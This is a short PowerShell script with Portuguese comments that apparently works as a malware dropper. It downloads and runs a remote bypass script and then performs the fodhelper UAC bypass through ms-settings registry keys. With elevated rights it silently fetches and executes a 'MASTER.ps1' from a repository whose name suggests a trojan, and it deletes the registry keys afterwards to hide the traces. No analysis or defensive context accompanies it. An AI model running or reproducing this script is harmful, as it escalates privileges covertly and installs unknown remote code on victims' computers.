iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EugeneBelford1995/Invoke-BypassII/main/Invoke-BypassII.ps1'))

# Define o comando que será executado no PowerShell admin (em modo oculto)
$program = "powershell.exe -WindowStyle Hidden -NoExit -Command {
    # Baixa e executa o script mestre (MASTER.ps1)
    iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/MASTER.ps1'))
}"

# Cria as chaves de registro para o bypass
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

# Dispara o bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force